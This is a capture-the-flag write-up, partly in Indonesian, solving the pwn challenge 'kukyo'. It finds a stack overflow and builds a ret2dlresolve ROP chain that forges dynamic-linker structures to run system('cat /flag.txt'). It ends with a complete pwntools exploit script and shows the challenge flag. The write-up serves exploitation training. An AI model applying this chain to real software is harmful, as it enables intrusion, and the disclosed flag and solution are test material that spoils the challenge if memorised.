---
slug: "testkukyo"
title: "kukyo - test import"
competition: "PlayITPlus"
category: "Pwn"
difficulty: null
date: "2026-11-08"
updated: "2026-11-13"
summary: "ret2dlresolve with unexpected no gadget ahh."
tags: []
status: "published"
flag: "PLAYITPLUS{773ed891fe2d30dfb9d67c6d7aac868efb542157929bc8636494a5b103225a6b}"
attachments: []
---

<h2>TL;DR</h2><p>ret2dlresolve with unexpected no gadget ahh.</p><h2>Challenge</h2><ul><li><p><strong>Poin / solves:</strong> 500 / 1</p></li><li><p><strong>Deskripsi:</strong> A quiet little program takes two records and says nothing back. Can you make it tell you something useful?</p></li><li><p>Link aseli: <a target="_blank" rel="noopener noreferrer nofollow" href="https://app.notion.com/p/kukyo-412d29486a2c80f6b040c5a1fb9aaf35?pvs=21">https://app.notion.com/p/kukyo-412d29486a2c80f6b040c5a1fb9aaf35?source=copy_link</a></p></li><li><p>AI: <a target="_blank" rel="noopener noreferrer nofollow" href="https://chat.deepseek.com/share/fde2anjc20urpgdedh">https://chat.deepseek.com/share/fde2anjc20urpgdedh</a></p></li></ul><h2>Recon</h2><p>Firstly, we checksec this challenge to know that is the protection and how to approach.</p><pre><code class="language-bash">~/ctf/playit/pwn/kukyo
❯ checksec kukyo                                                                󰥔 13:28:10
[*] '/home/claritys/ctf/playit/pwn/kukyo/kukyo'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
</code></pre><p>Yang nyala hanya <code>Partial RELRO</code> (tetep bisa <code>GOT overwrite</code>) dan <code>NX Enabled</code> (nggak bisa shellcode).</p><p>Sekarang kita decompile chall ini untuk mengetahui flownya.</p><pre><code>
//----- (000000000040115F) ----------------------------------------------------
ssize_t __fastcall exact(char *a1, size_t a2)
{
  ssize_t result; // rax
  ssize_t v4; // [rsp+10h] [rbp-10h]
  char *buf; // [rsp+18h] [rbp-8h]<p>  result = (ssize_t)a1;
  buf = a1;
  while ( a2 != 0 )
  {
    v4 = read(0, buf, a2);
    if ( v4 &lt;= 0 )
      _exit(0);
    buf += v4;
    result = v4;
    a2 -= v4;
  }
  return result;
}</p>
<p>//----- (00000000004011BE) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[64]; // [rsp+0h] [rbp-40h] BYREF</p>
<p>  exact(ledger, 0x40u);
  exact(v4, 0xA0u);
  close(0);
  return 0;
}
</code></pre><h2>Vulnerability</h2><p>Kita mulai dari function <code>main</code>, ada function <code>close(0)</code> yang di mana menjadikan kita nanti nggak bisa dapetin shell tetapi harus langsung direct ke tempat flagnya. Because <code>close(0)</code> dia menutup standard input, so we can’t input some character to run a command like <code>cat /flag.txt</code> when you got the <code>/bin/bash</code>.</p><p>For the function <code>exact</code>, dia cara kalau dipanggil nanti parameter pertama menjadi <strong>ukuran</strong> untuk menaruh inputan kita (tapi nggak ditaruh di situ), untuk parameter kedua itu untuk menentukan berapa byte input kita yang bisa kita masukkan ke function <code>read</code>.</p><p>But the catch is, jumlah input kita harus sama dengan paramer kedua (<code>a2</code>), karena <code>a2 != 0</code>. <code>a2</code> harus <code>= 0</code>. Biar nanti programnya bisa <code>return</code>.</p><p>Anyhow, there’s a mysterious function that does nothing at decompiler.</p><pre><code>//----- (0000000000401156) ----------------------------------------------------
void handle()
{
  ;
}
</code></pre><p>But at the disassembly say the otherwise. This function is our key to fill the gaps for the <code>exploit</code>.</p><p></p><img src="https://dfbro.my.id/assets/uploads/7e8e89d3-5cf1-435c-bf82-7146094edf70-image.png" alt="image.png"><p>Because after we search for the gadget that begins with <code>pop*</code> itu malah gak guna:</p><pre><code class="language-bash">
~/ctf/playit/pwn/kukyo
❯ ropper --file kukyo --search "pop"                                            󰥔 13:46:07
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop</p>
<p>[INFO] File: kukyo
0x000000000040113d: pop rbp; ret;
</code></pre><p>Jadi ya itu adalah kunci exploit kita function <code>handle</code>. Disassembly-nya si <code>handle</code> itu <code>lea rdi, [rsp+0x10] ; ret</code> jadi dia bikin <code>rdi</code> nunjuk ke stack yang kita kontrol. Ini <strong>pengganti </strong><code>pop rdi</code> yang nggak ada di binary yang hanya ada <code>pop rbp; ret</code> dari ropper.</p><p>For the first call of the function <code>exact</code>, there’s a free write to <code>.bss</code>. Because dia dideklarasikan secara global dan static addressnya. Kita bisa ambil addressnya buat nanti:</p><pre><code class="language-python">pwndbg&gt; p&amp; ledger
$1 = (&lt;data variable, no debug info&gt; *) 0x404038 &lt;ledger&gt;
</code></pre><p>Karena ini bisa berguna untuk ngasih <code>cat /flag.txt</code> atau semacamnya.</p><p>So as we can see, there’s a buffer overflow in the second call of the function <code>exact</code>.</p><pre><code class="language-python">  exact(v4, 0xA0u);
</code></pre><p>Because if we simulate at the function exact, there will be a buffer overflow when it comes to this:</p><pre><code class="language-python">    v4 = read(0, buf, a2);
</code></pre><p>Karena <code>a2</code> adalah si <code>0xA0</code> dan <code>buf</code> itu sizenya seperti <code>v4</code> yang bisa menampung <code>64</code> bytes aja. Jadi kita bisa overwrite return address di sini.</p><p>At first I thought this is a ret2libc challenge, but turns out this challenge is ret2dlresolve. Because there’s no leak.</p><p>Sekarang kita calculate offset yang ada di function <code>exact</code>.</p><pre><code class="language-c">&gt;&gt;&gt; 64 + 8
72
</code></pre><p>Yang di mana <code>64</code> itu ukuran si buffer kita yang dari <code>v4</code>, terus <code>8</code> untuk <code>Save RBP</code>.</p><h2>Exploit plan</h2><p>Karena nggak ada leak (no <code>write</code>/<code>puts</code>/<code>system</code> di PLT). Jadi kita suruh <strong>dynamic linker</strong> resolve <code>system</code> sendiri berdasarkan nama, lewat fake <code>Elf64_Sym</code> + <code>Elf64_Rela</code> + string <code>"system"</code>. That’s ret2dlresolve.</p><ol><li><p><strong>Staging fake structure di </strong><code>ledger</code><strong> (</strong><code>0x404038</code><strong>).</strong> Nggak usah repot nyari <code>pop rsi</code>/<code>pop rdx</code> buat nulis struktur <code>exact(ledger, 0x40)</code> udah ngasih <strong>fixed-address write</strong> 64 byte ke <code>.bss</code>. Pas banget buat ret2dlresolve yang emang butuh alamat absolut tetap (No PIE).</p></li><li><p><strong>Muat-muatin di 64 byte ( di link ai deepseekx bilang ini Opsi C).</strong> <code>Elf64_Sym</code> (24) + <code>"system\0"</code> (7) + <code>Elf64_Rela</code> (24) = 55 byte, muat. Tapi alamat <code>Sym</code>/<code>Rela</code> wajib bikin index-nya integer. Tabel: <code>SYMTAB 0x400390</code>, <code>STRTAB 0x400450</code>, <code>JMPREL 0x400580</code>, <code>read@got 0x404010</code>, <code>PLT0 0x401020</code>.</p></li></ol><p>Dapet valuenya dari:</p><pre><code class="language-python">~/ctf/playit/pwn/kukyo
❯ readelf -d kukyo                                                              󰥔 06:45:23</p>
<p>Dynamic section at offset 0x2df8 contains 24 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
--- snippet ---
 0x000000006ffffef5 (GNU_HASH)           0x400370
 0x0000000000000005 (STRTAB)             0x400450 #catat
 0x0000000000000006 (SYMTAB)             0x400390 #catat
 0x000000000000000a (STRSZ)              138 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x403fe8
 0x0000000000000002 (PLTRELSZ)           72 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x400580 #catat
 0x0000000000000007 (RELA)               0x400520
 0x0000000000000008 (RELASZ)             96 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffe (VERNEED)            0x4004f0
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x4004da
 0x0000000000000000 (NULL)               0x0
</code></pre><pre><code class="language-python">~/ctf/playit/pwn/kukyo
❯ readelf -r kukyo                                                                        󰥔 06:47:27</p>
<p>Relocation section &#39;.rela.dyn&#39; at offset 0x520 contains 4 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000403fc8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 <a href="mailto:__libc_start_main@GLIBC_2.34">__libc_start_main@GLIBC_2.34</a> + 0
000000403fd0  000200000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0
000000403fd8  000600000006 R_X86_64_GLOB_DAT 0000000000000000 <strong>gmon_start</strong> + 0
000000403fe0  000700000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0</p>
<p>Relocation section &#39;.rela.plt&#39; at offset 0x580 contains 3 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404000  000300000007 R_X86_64_JUMP_SLO 0000000000000000 <a href="mailto:_exit@GLIBC_2.2.5">_exit@GLIBC_2.2.5</a> + 0
000000404008  000400000007 R_X86_64_JUMP_SLO 0000000000000000 <a href="mailto:close@GLIBC_2.2.5">close@GLIBC_2.2.5</a> + 0
000000404010  000500000007 R_X86_64_JUMP_SLO 0000000000000000 <a href="mailto:read@GLIBC_2.2.5">read@GLIBC_2.2.5</a> + 0 #catat
</code></pre><p>Terus ini buat <code>PLT0</code> nya:</p><p></p><img src="https://dfbro.my.id/assets/uploads/d6759f69-0281-408d-9248-0e10170c57b3-image-1.png" alt="image.png"><ol><li><p><code>rdi</code><strong> dari stack, command di stack.</strong> <code>handle</code> ngasih <code>rdi = rsp+0x10</code> = alamat <strong>stack</strong>, bukan ledger. Jadi string <code>"cat /flag.txt"</code> ditaruh di <strong>stack</strong> (nyambung di ROP chain), bukan di ledger. <code>cat</code>, bukan <code>/bin/sh</code>, gara-gara <code>close(0)</code> tadi.</p></li></ol><p>Terus tinggal kita rakit deh payloadnya. Di sini untuk payload aku masih menyuruh Deepseek, tapi kalau gak salah ada function bawaan <code>pwntools</code> yang dia itu membantu banget jadi ngga usah ngerakit payload sepanjang ini dan serumit ini:</p><pre><code class="language-python">    payload1 = p32(15360) + b"\x12\x00" + p16(0) + p64(0) + p64(0)   # Sym, 24 B
    payload1 += b"system\x00" + b"\x00"*9                            # string @+24, 16 B
    payload1 += p64(0x404010) + p64(0x0000028700000007) + p64(0)     # Rela @+40, 24 B</p>
<pre><code>payload2 = b&quot;A&quot;*72
payload2 += p64(0x401156)          # handle  -&amp;gt; rdi = rsp+0x10
payload2 += p64(0x401020)          # PLT0    -&amp;gt; return dari handle
payload2 += p64(628)               # reloc_index, di [rsp] saat PLT0
payload2 += b&quot;cat /flag.txt\x00&quot;   # rdi menunjuk ke sini
payload2 += b&quot;B&quot;*(0xA0 - 72 - 8*3 - len(&quot;cat /flag.txt\x00&quot;))  # isi sisa a2
</code></pre>
<p></code></pre><p>We try to run it at locally and it works.</p><p></p><img src="https://dfbro.my.id/assets/uploads/5b624922-f13f-4504-9878-ea2d472f15c9-image-2.png" alt="image.png"><p>Now let’s do it remotely, but sadly pas aku nyoba remote itu ngga bisa. Terus aku lihat nggak bisa, jadi kemungkinan ini stack alignment.</p><p></p><img src="https://dfbro.my.id/assets/uploads/ac475f09-bbda-41fa-ac46-d665dec5721a-image-3.png" alt="image.png"><p>Jadi kita tambahkan return sebelum ke <code>handle</code>.</p><pre><code class="language-python">    ret = 0x000000000040115b #ini return address dari handle.
    payload1 = p32(15360) + b"\x12\x00" + p16(0) + p64(0) + p64(0)   # Sym, 24 B
    payload1 += b"system\x00" + b"\x00"*9                            # string @+24, 16 B
    payload1 += p64(0x404010) + p64(0x0000028700000007) + p64(0)     # Rela @+40, 24 B</p>
<pre><code>payload2 = b&quot;A&quot;*72
payload2 += p64(ret) #buat stack alignment
payload2 += p64(0x401156)          # handle  -&amp;gt; rdi = rsp+0x10
payload2 += p64(0x401020)          # PLT0    -&amp;gt; return dari handle
payload2 += p64(628)               # reloc_index, di [rsp] saat PLT0
payload2 += b&quot;cat /flag.txt\x00&quot;   # rdi menunjuk ke sini
payload2 += b&quot;B&quot;*(0xA0 - 72 - 8*3 - len(&quot;cat /flag.txt\x00&quot;))  # isi sisa a2
</code></pre>
<p></code></pre><p>Lalu setelah kita coba remote berhasil deh.</p><p></p><img src="https://dfbro.my.id/assets/uploads/24df2cea-3979-4485-a121-8f7255397645-image-4.png" alt="image.png"><h2>Exploit</h2><pre><code class="language-python">~/ctf/playit/pwn/kukyo
❯ cat solve.py                                                                  󰥔 04:45:38
#!/usr/bin/env python3</p>
<p>from pwn import *</p>
<p>elf = ELF(&quot;kukyo&quot;)</p>
<p>context.binary = elf
context.terminal = [&quot;ghostty&quot;, &quot;-e&quot;]
context.gdb_binary = &quot;pwndbg&quot;</p>
<p>if args.DEBUG:
    context.log_level = &quot;debug&quot;</p>
<p>gdbscript = &quot;&quot;&quot;
set pagination off
set confirm off</p>
<p>break main
continue
&quot;&quot;&quot;</p>
<p>def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r</p>
<pre><code>if args.LOCAL:
    return process([elf.path])

return remote(&quot;10.0.2.3&quot;, 4267)
</code></pre>
<p>def main():
    r = conn()
    ret = 0x000000000040115b
    payload1 = p32(15360) + b&quot;\x12\x00&quot; + p16(0) + p64(0) + p64(0)   # Sym, 24 B
    payload1 += b&quot;system\x00&quot; + b&quot;\x00&quot;*9                            # string @+24, 16 B
    payload1 += p64(0x404010) + p64(0x0000028700000007) + p64(0)     # Rela @+40, 24 B</p>
<pre><code>payload2 = b&quot;A&quot;*72
payload2 += p64(ret)
payload2 += p64(0x401156)          # handle  -&amp;gt; rdi = rsp+0x10
payload2 += p64(0x401020)          # PLT0    -&amp;gt; return dari handle
payload2 += p64(628)               # reloc_index, di [rsp] saat PLT0
payload2 += b&quot;cat /flag.txt\x00&quot;   # rdi menunjuk ke sini
payload2 += b&quot;B&quot;*(0xA0 - 72 - 8*3 - len(&quot;cat /flag.txt\x00&quot;))  # isi sisa a2
r.send(payload1)
r.send(payload2)

# good luck pwning :)
r.interactive()
</code></pre>
<p>if <strong>name</strong> == &quot;<strong>main</strong>&quot;:
    main()
</code></pre><p></p></p>
